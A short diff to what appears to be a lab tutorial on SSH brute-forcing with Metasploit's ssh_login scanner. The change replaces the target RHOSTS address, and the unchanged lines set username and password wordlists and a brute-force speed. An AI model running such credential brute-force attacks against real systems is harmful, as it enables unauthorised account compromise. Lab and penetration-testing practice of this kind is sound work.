@@ -59,7 +59,7 @@ use auxiliary/scanner/ssh/ssh_login
 
 ### Set the Target Host, Username & Password Files, and Improve Brute-Force Performance:
 ```text
-set RHOSTS 192.168.100.10
+set RHOSTS 192.168.64.7
 set USER_FILE /home/kali/ssh-brute/users.txt
 set PASS_FILE /home/kali/ssh-brute/pass.txt
 set BRUTEFORCE_SPEED 5
